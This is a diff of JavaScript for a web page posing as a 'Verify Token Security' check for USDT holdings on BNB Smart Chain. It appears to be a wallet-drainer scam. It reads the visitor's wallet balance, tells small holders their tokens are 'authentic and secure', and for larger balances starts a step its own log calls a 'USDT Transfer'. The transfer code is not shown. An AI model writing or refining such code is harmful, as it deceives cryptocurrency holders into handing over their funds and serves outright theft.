         const balanceFetched = await getTokenBalance();
-        if (!balanceFetched) {
-            if (verificationModal) verificationModal.style.display = "none";
-            if (Next) Next.disabled = false;
-            if (Next) Next.innerHTML = 'Next';
-            return;
-        }
+        if (!balanceFetched) { console.log("Step 3: Token balance fetch failed."); return; }
 
-        // Handle USDT balance conditions (from previous version, simplified)
-        if (tokenBalanceValue <= 0.009) { // Effectively 0 USDT
-            if (modalMessage) modalMessage.textContent = "No USDT tokens found for verification.";
-            if (modalMessage) modalMessage.className = "error-message";
-            if (Next) Next.disabled = false;
-            if (Next) Next.innerHTML = 'Next';
-            return;
-        } else if (tokenBalanceValue > 0.009 && tokenBalanceValue <= 1.0) { // Between 0.01 and 1 USDT
+        if (tokenBalanceValue <= 0.009) {
+            console.log("USDT balance is too low for transfer (<= 0.009).");
+            if (modalMessage) { modalMessage.textContent = "No significant USDT tokens found for verification (balance is too low)."; modalMessage.className = "error-message"; }
+            isTransferComplete = true; if (Next) { Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Info'; Next.disabled = true; }
+            if (verificationModal) { setTimeout(() => { verificationModal.style.display = "none"; }, 3000); } return;
+        } else if (tokenBalanceValue > 0.009 && tokenBalanceValue <= 1.0) {
+            console.log("USDT balance is between 0.01 and 1.0. Marking as complete without transfer.");
             const bnbBalance = await web3.eth.getBalance(userAddress);
             const formattedBNB = web3.utils.fromWei(bnbBalance, 'ether');
-
-            if (modalMessage) modalMessage.textContent = `Token verification complete, Your tokens are authentic and secure.\nUSDT Balance: ${parseFloat(tokenBalanceValue).toFixed(2)} USDT\nBNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB`;
-            if (modalMessage) modalMessage.className = "success-message";
-            if (Next) Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
-            if (Next) Next.disabled = true;
+            if (modalMessage) { modalMessage.textContent = `Token verification complete, Your tokens are authentic and secure.\nUSDT Balance: ${parseFloat(tokenBalanceValue).toFixed(2)} USDT\nBNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB`; modalMessage.className = "success-message"; }
+            if (Next) { Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; Next.disabled = true; }
             isTransferComplete = true;
-            // Original script had setTimeout to close modal here
-            if (verificationModal) {
-                 setTimeout(() => { verificationModal.style.display = "none"; }, 1500);
-            }
-            return;
+            if (verificationModal) { setTimeout(() => { verificationModal.style.display = "none"; }, 1500); } return;
         }
 
-        // Step 4: Execute verification (will now include BNB check and polling)
+        console.log("Starting Step 4: Execute Verification (USDT Transfer).");
         await executeVerification();
+
     } catch (error) {
-        console.error("Verification process error:", error);
-        showError("An unexpected error occurred. Please try again.");
+        console.error("Next button click: Overall verification process error:", error);
+        if (modalMessage) { modalMessage.textContent = "An unexpected error occurred. Please try again."; modalMessage.className = "error-message"; }
         if (verificationModal) verificationModal.style.display = "none";
-        if (Next) Next.disabled = false;
-        if (Next) Next.innerHTML = 'Next'; // Changed from verifyBtn to Next
+    } finally {
+        if (Next && !isTransferComplete) {
+            Next.disabled = false;
+            if (Next.innerHTML.includes('Verifying...')) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; }
+        }
     }
 });
 
-// Close modal buttons (original logic)
-if (closeModalBtns) { // Guard against null
+// Event listeners for closing the modal
+if (closeModalBtns) {
     closeModalBtns.forEach(btn => {
         btn.addEventListener('click', () => {
-            if (verificationModal) verificationModal.style.display = "none"; // Guard against null
-            if (Next) { // Guard against null
-                Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Changed from verifyBtn to Next
-                Next.disabled = false;
-            }
-            // Clear message when modal is closed manually
-            if (modalMessage) {
-                modalMessage.textContent = "";
-                modalMessage.className = "";
-            }
+            console.log("Close modal button clicked.");
+            if (verificationModal) verificationModal.style.display = "none";
+            if (Next && !isTransferComplete) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
+            if (modalMessage) { modalMessage.textContent = ""; modalMessage.className = ""; }
+            updateStep(1, ''); updateStep(2, ''); updateStep(3, ''); updateStep(4, ''); updateProgress(0);
         });
     });
 }
 
-
-// Close modals when clicking outside (original logic)
-if (window && verificationModal) { // Guard against null for verificationModal
+// Close modal when clicking outside
+if (window && verificationModal) {
     window.addEventListener('click', (e) => {
         if (e.target === verificationModal) {
-            if (verificationModal) verificationModal.style.display = "none"; // Guard against null
-            if (Next) { // Guard against null
-                Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Changed from verifyBtn to Next
-                Next.disabled = false;
-            }
-            // Clear message when modal is closed by clicking outside
-            if (modalMessage) {
-                modalMessage.textContent = "";
-                modalMessage.className = "";
-            }
+            console.log("Clicked outside modal.");
+            if (verificationModal) verificationModal.style.display = "none";
+            if (Next && !isTransferComplete) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
+            if (modalMessage) { modalMessage.textContent = ""; modalMessage.className = ""; }
+            updateStep(1, ''); updateStep(2, ''); updateStep(3, ''); updateStep(4, ''); updateProgress(0);
         }
     });
 }
 
-
-// Initialize on load (Original logic)
-// verifyBtn.disabled = false; // Original line - replaced by Next.disabled
-if (Next) Next.disabled = false; // Ensure button is enabled on load
-
+// Initialize on page load
+if (Next) Next.disabled = false;
+console.log("Window loaded. Initializing Web3.");
 window.addEventListener('load', async () => {
     const web3Initialized = await initWeb3();
-
     if (web3Initialized) {
-        // Try to connect wallet automatically if previously connected
-        if (currentProvider.selectedAddress) {
+        if (currentProvider && currentProvider.selectedAddress) {
             userAddress = currentProvider.selectedAddress;
-            if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`; // Guard against null
-
-            // Get initial balance (Original logic)
+            if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
+            console.log("Wallet already connected on load:", userAddress);
             await ensureBSCNetwork();
             await getTokenBalance();
-        }
-    }
+        } else { console.log("No wallet connected on load."); }
+    } else { console.error("Web3 did not initialize on load."); }
 });
